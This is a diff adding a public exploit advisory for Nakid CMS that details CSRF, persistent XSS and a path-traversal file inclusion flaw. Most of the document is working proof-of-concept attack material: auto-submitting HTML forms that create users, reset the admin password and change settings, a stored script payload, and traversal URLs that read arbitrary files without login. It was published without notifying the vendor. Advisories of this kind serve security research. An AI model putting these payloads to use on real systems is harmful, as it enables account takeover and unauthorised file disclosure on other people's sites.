@@ -1,0 +1,284 @@
+# Exploit Title:  CSRF, Persistent XSS & LFI
+# Google Dork: intitle: CSRF, Persistent XSS & LFI
+# Date: 2015-06-11
+# Exploit Author:  John Page ( hyp3rlinx )
+# Website: hyp3rlinx.altervista.org
+# Vendor Homepage: kilrizzy.github.io/Nakid-CMS
+# Software Link: kilrizzy.github.io/Nakid-CMS
+# Version: kilrizzy-Nakid-CMS-f274624
+# Tested on: windows 7 on XAMPP
+# Category: webapps
+
+
+Vendor:
+================================
+http://kilrizzy.github.io/Nakid-CMS/
+
+
+
+Product:
+================================
+kilrizzy-Nakid-CMS-f274624
+Nakid CMS is an open source content management system built using PHP and
+CodeIgniter.
+
+
+Setup mode:
+==========
+Under root dir for Nakid CMS we set to production mode instead of
+development in index.php.
+e.g. define('ENVIRONMENT', 'production');
+
+
+
+Advisory Information:
+================================================
+CSRF, Persistent XSS &  Auth bypass LFI
+
+
+
+Vulnerability Details:
+=====================
+Multiple CSRF(s) exist:
+
+We have ability to do the following as no CSRF tokens are present.
+
+1-Change Admin password
+2-Add arbitrary users to system
+3-Alter system settings
+
+
+
+XSS (persistent):
+XSS parameter vulnerabilities exist for the following:
+payloads will be stored in the MySQL database and activated when a victim
+visits the vulnerable webpage.
+
+
+XSS URL:
+--------
+http://localhost/kilrizzy-Nakid-CMS-f274624/kilrizzy-Nakid-CMS-f274624/index.php/system/users
+On the "Edit Record" pop up dialog box.
+
+
+Vulnerable parameters:
+---------------------
+username
+password
+email
+fname
+lname
+
+
+XSS URL:
+--------
+http://localhost/kilrizzy-Nakid-CMS-f274624/kilrizzy-Nakid-CMS-f274624/index.php/system/settings
+On the "Edit Record" pop up dialog box.
+
+
+Vulnerable parameters:
+---------------------
+from_name
+include_path
+primary_email
+from_email
+
+
+XSS URL:
+--------
+http://localhost/kilrizzy-Nakid-CMS-f274624/kilrizzy-Nakid-CMS-f274624/index.php/system/content_edit/1
+
+Vulnerable parameter:
+--------------------
+title
+
+
+Authentication bypass LFI:
+Local file inclusion to bypass access controls and read aribitrary files
+exist by setting '$url' PHP variable on following URL
+
+index.php/connector$url
+
+
+
+Exploit POC code(s):
+====================
+
+CSRF(s):
+========
+
+Condition:
+Pursuade victim to visit our webpage or click our link, if they have a
+session then we do our CSRF!.
+
+
+1- Add arbitrary user to system
+--------------------------------
+
+<!DOCTYPE>
+<html>
+<head>
+<script>
+function doit(){
+var e=document.getElementById('ruinurlife')
+e.submit()
+}
+</script>
+</head>
+<body onLoad="doit()">
+<form id="ruinurlife" action="
+http://localhost/kilrizzy-Nakid-CMS-f274624/kilrizzy-Nakid-CMS-f274624/index.php/grid/users"
+method="post">
+<input type="text" name="username" value="sum1" />
+<input type="text" name="password" value="abc123" />
+<input type="text" name="email" value="X@X.com"/>
+<input type="text" name="fname" value="sum"/>
+<input type="text" name="lname" value="1"/>
+<input type="text" name="oper" value="add"/>
+<input type="text" name="id" value="_empty"/>
+</form>
+</body>
+</html>
+
+
+2-Change Admin password
+------------------------
+
+<!DOCTYPE>
+<html>
+<head>
+<script>
+function doit(){
+var e=document.getElementById('ruinurlife')
+e.submit()
+}
+</script>
+</head>
+<body onLoad="doit()">
+<form id="ruinurlife" action="
+http://localhost/kilrizzy-Nakid-CMS-f274624/kilrizzy-Nakid-CMS-f274624/index.php/system/profile"
+method="post">
+<input type="text" name="username" value="admin" />
+<input type="text" name="password" value="xyz123" />
+<input type="text" name="email" value="hell@abyss.com"/>
+<input type="text" name="fname" value="hyp3r"/>
+<input type="text" name="lname" value="linx"/>
+<input type="text" name="action" value="edit_profile"/>
+<input type="text" name="submitbt" value="Save"/>
+</form>
+</body>
+</html>
+
+
+3-Alter system settings
+-----------------------
+
+<!DOCTYPE>
+<html>
+<head>
+<script>
+function doit(){
+var e=document.getElementById('ruinurlife')
+e.submit()
+}
+</script>
+</head>
+<body onLoad="doit()">
+<form id="ruinurlife" action="
+http://localhost/kilrizzy-Nakid-CMS-f274624/kilrizzy-Nakid-CMS-f274624/index.php/grid/settings"
+method="post">
+<input type="text" name="value" value="HELL@ABYSS.com" />
+<input type="text" name="oper" value="edit" />
+<input type="text" name="id" value="1"/>
+</form>
+</body>
+</html>
+
+
+XSS persistent POC code:
+=======================
+
+Inject <script>alert(666)</script> into any of the following vulnerable
+fields described above using POST method.
+Need to highlight a row then click edit dialog box to edit settings.
+
+e.g.
+
+http://localhost/kilrizzy-Nakid-CMS-f274624/kilrizzy-Nakid-CMS-f274624/index.php/system/settings
+
+from_name     <------- <script>alert(666)</script>
+include_path
+primary_email
+from_email
+
+
+Authorization bypass LFI:
+========================
+
+1- Logout, create a hell.txt file or whatever and put in 'htdocs' or web
+root, then visit the URL (change to suit your environment).
+
+2-
+http://localhost/kilrizzy-Nakid-CMS-f274624/kilrizzy-Nakid-CMS-f274624/index.php/connector$url=../../../../../../../hell.txt
+
+OR try
+
+http://localhost/kilrizzy-Nakid-CMS-f274624/kilrizzy-Nakid-CMS-f274624/index.php/connector$url=../../../../../../xampp/phpinfo.php
+
+
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification: NA
+June 11, 2015 : Public Disclosure
+
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+Request Method(s):         [+] GET & POST
+
+
+Vulnerable Product:        [+] kilrizzy-Nakid-CMS-f274624
+
+
+Vulnerable Parameter(s):   [+]
+                              username
+                              password
+                              email
+                              fname
+                              lname
+                              from_name
+                              include_path
+                              primary_email
+                              from_email
+                              title
+                              connector$url
+
+
+Affected Area(s):          [+] /system/users
+                               /system/profile
+                               /system/content_edit/
+
+===============================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author. The author is not responsible for any misuse of the information
+contained herein and prohibits any malicious use of all security related
+information or exploits by the author or elsewhere.
+
+
+(hyp3rlinx)
